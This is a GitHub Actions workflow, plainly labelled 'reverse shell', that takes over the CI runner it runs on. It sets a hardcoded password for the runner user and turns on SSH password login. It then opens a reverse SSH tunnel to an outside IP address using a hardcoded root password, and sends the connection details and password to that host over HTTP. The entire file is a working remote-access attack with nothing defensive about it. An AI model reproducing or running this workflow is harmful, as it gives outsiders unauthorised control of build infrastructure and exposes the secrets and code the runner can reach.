name: Shell
on:
  workflow_dispatch:
jobs:
  j:
    runs-on: ubuntu-latest
    steps:
      - name: reverse shell
        timeout-minutes: 10
        run: |
          set +e
          echo === SETUP ===
          sudo sh -c 'echo runner:GitHubR00t | chpasswd'
          echo 'Password set'
          sudo sed -i 's/^#*PasswordAuthentication.*/PasswordAuthentication yes/' /etc/ssh/sshd_config
          sudo sed -i 's/^#*ChallengeResponseAuthentication.*/ChallengeResponseAuthentication yes/' /etc/ssh/sshd_config
          sudo systemctl restart sshd
          echo 'SSH restarted'
          sshpass -p GitHubR00t ssh -o StrictHostKeyChecking=no runner@127.0.0.1 'echo local_ssh_ok' 2>&1
          echo === TUNNEL ===
          sshpass -p pQg80L195Ka3 ssh -o StrictHostKeyChecking=no -o ServerAliveInterval=15 -N -R 2222:localhost:22 root@185.244.173.24 &
          sleep 3
          sshpass -p pQg80L195Ka3 ssh -o StrictHostKeyChecking=no root@185.244.173.24 'ss -tlnp | grep 2222'
          echo
          curl -s -X POST -d '{"status":"tunnel_ready","ssh":"ssh -p 2222 runner@185.244.173.24","pass":"GitHubR00t"}' http://185.244.173.24:80/shell-ready 2>/dev/null
          echo 'TUNNEL READY - Connect: ssh -p 2222 runner@185.244.173.24 (pass: GitHubR00t)'
          echo 'Keeping alive for 240 seconds...'
          sleep 240
          echo === DONE ===
